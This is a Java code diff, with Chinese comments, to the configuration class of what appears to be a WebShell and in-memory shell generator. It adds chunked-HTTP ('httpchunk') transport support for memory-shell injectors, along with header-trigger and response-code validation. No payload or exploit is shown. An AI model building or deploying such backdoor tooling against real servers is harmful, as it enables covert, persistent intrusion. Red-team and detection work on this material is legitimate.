@@ -27,7 +27,7 @@ public class ShellGeneratorConfig {
     private String coreClassName;
     private byte[] coreClassBytes;
     private int respCode = 200;
-    // 传输协议。WebShell 支持 http/httpchunk；内存构建支持 http/websocket。
+    // 传输协议。WebShell 支持 http/httpchunk；内存构建支持 http/httpchunk/websocket。
     private String protocol = "http";
     // 区分旧客户端未传 protocol 与调用方显式选择 http，用于兼容旧版 WebSocketInjector 请求。
     private boolean protocolExplicitlyConfigured;
@@ -479,7 +479,7 @@ public class ShellGeneratorConfig {
     }
 
     public static List<String> getSupportedMemoryShellProtocols() {
-        return Collections.unmodifiableList(java.util.Arrays.asList("http", "websocket"));
+        return Collections.unmodifiableList(java.util.Arrays.asList("http", "httpchunk", "websocket"));
     }
 
     public String getMethodAction() {
@@ -580,13 +580,14 @@ public class ShellGeneratorConfig {
             throw new IllegalArgumentException("配置类中 packerType 不能为空");
         }
         boolean webSocketInjector = "WebSocketInjector".equals(shellType);
-        if ("httpchunk".equals(protocol)) {
-            throw new IllegalArgumentException(
-                    "httpchunk 协议仅支持 JSP/JSPX WebShell，内存构建仅支持 http 或 websocket");
-        }
+        boolean chunkInjector = shellType != null && shellType.contains("HTTPCHUNK");
         if (webSocketInjector && !protocolExplicitlyConfigured && "http".equals(protocol)) {
             // 旧版调用方只通过 shellType 表达 WebSocket；保持生成结果可用并返回准确协议。
             protocol = "websocket";
+        }
+        if (chunkInjector && !protocolExplicitlyConfigured && "http".equals(protocol)) {
+            // chunk 注入器需要 httpchunk 协议的帧通信，旧版调用方只传了 shellType。
+            protocol = "httpchunk";
         }
         if ("websocket".equals(protocol) && !webSocketInjector) {
             throw new IllegalArgumentException(
@@ -596,16 +597,31 @@ public class ShellGeneratorConfig {
             throw new IllegalArgumentException(
                     "WebSocketInjector 仅支持 websocket 协议");
         }
-        if ("http".equals(protocol)
+        if ("websocket".equals(protocol) && chunkInjector) {
+            throw new IllegalArgumentException(
+                    "HTTPCHUNK 注入器不支持 websocket 协议，请使用 httpchunk");
+        }
+        // http 和 httpchunk 都是 HTTP 协议变体，使用相同的 Header 门禁。
+        // httpchunk 使用 chunked 传输编码，但 Shell 模板通过 Servlet API
+        // (request.getInputStream / response.getOutputStream) 透明处理，
+        // 不设 Content-Length 时容器自动使用 chunked 编码响应。
+        if (("http".equals(protocol) || "httpchunk".equals(protocol))
                 && (headerName == null || headerName.trim().isEmpty()
                 || headerValue == null || headerValue.trim().isEmpty())) {
             throw new IllegalArgumentException(
-                    "http 内存构建的 headerName 和 headerValue 不能为空");
+                    protocol + " 内存构建的 headerName 和 headerValue 不能为空");
         }
         if ("websocket".equals(protocol)
                 && (urlPattern == null || !urlPattern.startsWith("/") || urlPattern.contains("*"))) {
             throw new IllegalArgumentException(
                     "websocket 的 urlPattern 必须是以 / 开头且不含通配符 * 的端点路径");
+        }
+        // HTTPCHUNK 帧协议要求响应状态码允许携带响应体（不能是 204/205/304）。
+        if (chunkInjector) {
+            if (respCode < 200 || respCode == 204 || respCode == 205 || respCode == 304) {
+                throw new IllegalArgumentException(
+                        "httpchunk 响应状态必须允许持续响应体: " + respCode);
+            }
         }
     }
 
